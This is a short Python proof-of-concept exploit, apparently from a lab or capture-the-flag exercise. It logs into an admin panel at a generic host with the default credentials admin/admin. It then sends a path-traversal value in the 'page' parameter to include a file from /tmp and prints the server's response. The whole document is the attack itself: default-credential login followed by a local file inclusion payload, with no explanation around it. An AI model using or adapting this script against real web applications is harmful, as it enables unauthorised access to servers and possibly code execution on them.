import requests

def preamble(jar):
    login_url = "http://app1.com/admin/index.php?page=login"
    data = {"adminname": "admin", "password": "admin"}
    r = requests.post(login_url, data=data, cookies=jar)


def main():
    jar = requests.cookies.RequestsCookieJar()
    preamble(jar)
    print(requests.get("http://app1.com/admin/index.php?page=../../../../../../../../tmp/pwn", cookies=jar).text)

if __name__ == '__main__':
    main()

